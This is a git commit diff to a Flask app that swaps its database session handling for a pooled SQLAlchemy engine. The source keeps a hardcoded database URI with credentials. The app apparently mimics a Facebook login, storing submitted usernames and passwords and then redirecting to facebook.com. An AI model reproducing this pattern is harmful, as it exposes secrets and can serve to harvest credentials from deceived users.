db6f8c1074587bd828a2667f8c31649b8890e1e3
janiyasir <janiyasir989@gmail.com>
2024-06-28 16:05:32 +0500

    Your commit message here

--- my_flask_app/app.py
+++ my_flask_app/app.py
@@ -1,12 +1,24 @@
 from flask import Flask, request, redirect, render_template
 from flask_sqlalchemy import SQLAlchemy
+from sqlalchemy import create_engine
+from sqlalchemy.orm import scoped_session, sessionmaker
 from werkzeug.security import generate_password_hash
 
 app = Flask(__name__)
 
 # Update the database URI with the provided credentials
-app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+pymysql://facebook_blindcity:59257e84d141d92bd5434c4f9c800c6ea897ef0f@cxr.h.filess.io:3307/facebook_blindcity'
+db_uri = 'mysql+pymysql://facebook_blindcity:59257e84d141d92bd5434c4f9c800c6ea897ef0f@cxr.h.filess.io:3307/facebook_blindcity'
+app.config['SQLALCHEMY_DATABASE_URI'] = db_uri
 app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
+
+# Create the SQLAlchemy engine with pool size and max overflow settings
+engine = create_engine(db_uri, pool_size=10, max_overflow=20)
+
+# Create a configured "Session" class
+Session = sessionmaker(bind=engine)
+
+# Create a Session
+session = scoped_session(Session)
 
 db = SQLAlchemy(app)
 
@@ -30,8 +42,8 @@ def login():
         new_user = User(username=username, password=generate_password_hash(password))
         
         # Add the user to the database session and commit
-        db.session.add(new_user)
-        db.session.commit()
+        session.add(new_user)
+        session.commit()
         
         # Optionally, you can redirect to another page after successful save
         return redirect('https://www.facebook.com/')
